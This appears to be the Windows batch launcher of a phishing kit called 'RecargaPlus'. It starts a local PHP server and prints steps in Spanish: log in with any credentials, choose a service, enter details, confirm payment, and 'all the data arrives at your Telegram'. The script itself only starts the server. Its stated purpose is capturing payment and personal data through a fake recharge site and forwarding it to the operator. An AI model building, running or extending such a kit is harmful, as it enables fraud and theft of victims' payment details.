@echo off
cls
echo ================================================
echo          RecargaPlus - Servidor Local
echo ================================================
echo.
echo [OK] Iniciando servidor PHP...
echo [OK] URL: http://localhost:8000
echo.
echo ================================================
echo  IMPORTANTE - NO CIERRES ESTA VENTANA
echo ================================================
echo.
echo Para usar RecargaPlus:
echo 1. Abri tu navegador
echo 2. Anda a: http://localhost:8000
echo 3. Hace login (usuario y pass cualquiera)
echo 4. Selecciona servicio
echo 5. Completa datos
echo 6. Confirma pago
echo 7. Todos los datos llegan a tu Telegram!
echo.
echo ================================================
echo.
php -S localhost:8000
pause